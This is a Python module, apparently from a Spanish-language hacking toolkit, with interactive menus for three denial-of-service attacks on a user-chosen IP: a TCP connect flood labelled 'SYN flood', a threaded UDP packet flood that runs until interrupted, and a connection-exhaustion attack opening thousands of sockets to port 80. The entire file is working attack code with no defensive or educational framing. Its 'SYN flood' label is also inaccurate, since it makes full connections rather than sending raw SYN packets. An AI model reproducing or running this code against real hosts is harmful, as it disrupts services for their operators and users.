# -*- coding: utf-8 -*-

import socket
import threading
import time
from core.utils import clear_screen
from core.config import IP_BANNER

stop_attack = False

def syn_flood_attack():
    global stop_attack
    clear_screen()
    print("[94m" + IP_BANNER + "[0m")
    
    print("[96m" + "="*50 + "[0m")
    print("[96m  ATAQUE SYN FLOOD[0m")
    print("[96m" + "="*50 + "[0m")
    print()
    
    target = input("[93m[>] IP objetivo: [0m").strip()
    try:
        port = int(input("[93m[>] Puerto objetivo: [0m"))
    except:
        print("[91m[!] Puerto inválido[0m")
        time.sleep(1)
        return
    
    try:
        threads = int(input("[93m[>] Número de hilos (100-1000): [0m"))
    except:
        threads = 500
    
    duration_input = input("[93m[>] Duración en segundos (0=infinito): [0m")
    try:
        duration = int(duration_input)
    except:
        duration = 60
    
    print()
    print("[91m" + "="*50 + "[0m")
    print(f"[91m  ⚠️  INICIANDO SYN FLOOD[0m")
    print(f"[91m  Objetivo: {target}:{port}[0m")
    print(f"[91m  Hilos: {threads}[0m")
    print("[91m" + "="*50 + "[0m")
    print("[93m[*] Presiona Ctrl+C para detener[0m")
    print()
    
    stop_attack = False
    packets_sent = [0]
    start_time = time.time()
    
    def attack_thread():
        while not stop_attack:
            if duration > 0 and time.time() - start_time > duration:
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target, port))
                packets_sent[0] += 1
                sock.close()
            except:
                packets_sent[0] += 1
    
    for _ in range(threads):
        t = threading.Thread(target=attack_thread)
        t.daemon = True
        t.start()
    
    try:
        while not stop_attack:
            if duration > 0 and time.time() - start_time > duration:
                break
            time.sleep(1)
            elapsed = int(time.time() - start_time)
            print(f"\r[92m[+] Paquetes: {packets_sent[0]} | Tiempo: {elapsed}s[0m", end='')
    except KeyboardInterrupt:
        pass
    
    stop_attack = True
    print("\n")
    print(f"[92m[✓] Ataque finalizado. Total paquetes: {packets_sent[0]}[0m")
    time.sleep(1)

def udp_flood_attack():
    global stop_attack
    clear_screen()
    print("[94m" + IP_BANNER + "[0m")
    
    print("[96m" + "="*50 + "[0m")
    print("[96m  ATAQUE UDP FLOOD[0m")
    print("[96m" + "="*50 + "[0m")
    print()
    
    target = input("[93m[>] IP objetivo: [0m").strip()
    try:
        port = int(input("[93m[>] Puerto objetivo: [0m"))
    except:
        port = 80
    try:
        threads = int(input("[93m[>] Número de hilos: [0m"))
    except:
        threads = 500
    size = input("[93m[>] Tamaño paquete en bytes (1024-65507): [0m")
    try:
        packet_size = int(size)
    except:
        packet_size = 1024
    
    print()
    print("[91m" + "="*50 + "[0m")
    print(f"[91m  ⚠️  INICIANDO UDP FLOOD[0m")
    print(f"[91m  Objetivo: {target}:{port}[0m")
    print("[91m" + "="*50 + "[0m")
    print()
    
    stop_attack = False
    packets_sent = [0]
    
    def udp_thread():
        while not stop_attack:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = b'X' * packet_size
                sock.sendto(data, (target, port))
                packets_sent[0] += 1
            except:
                pass
    
    for _ in range(threads):
        t = threading.Thread(target=udp_thread)
        t.daemon = True
        t.start()
    
    try:
        while True:
            time.sleep(1)
            print(f"\r[92m[+] Paquetes UDP enviados: {packets_sent[0]}[0m", end='')
    except KeyboardInterrupt:
        stop_attack = True
        print("\n")
        print(f"[92m[✓] Ataque detenido. Total: {packets_sent[0]}[0m")
        time.sleep(1)

def connection_bruteforce():
    clear_screen()
    print("[94m" + IP_BANNER + "[0m")
    
    print("[96m" + "="*50 + "[0m")
    print("[96m  ATAQUE DE FUERZA BRUTA - CONEXIONES[0m")
    print("[96m" + "="*50 + "[0m")
    print()
    
    target = input("[93m[>] IP objetivo: [0m").strip()
    try:
        max_connections = int(input("[93m[>] Máximo de conexiones (1000-10000): [0m"))
    except:
        max_connections = 5000
    
    connections = []
    count = 0
    
    print()
    print("[91m" + "="*50 + "[0m")
    print(f"[91m  INICIANDO FUERZA BRUTA DE CONEXIONES[0m")
    print("[91m" + "="*50 + "[0m")
    print("[93m[*] Presiona Ctrl+C para detener[0m")
    print()
    
    try:
        while count < max_connections:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setblocking(0)
                sock.connect_ex((target, 80))
                connections.append(sock)
                count += 1
                if count % 100 == 0:
                    print(f"[92m[+] Conexiones activas: {count}[0m")
            except:
                pass
    except KeyboardInterrupt:
        pass
    
    print(f"\n[92m[✓] Total conexiones creadas: {count}[0m")
    print("[93m[*] Cerrando conexiones...[0m")
    for sock in connections:
        try:
            sock.close()
        except:
            pass
    time.sleep(1)
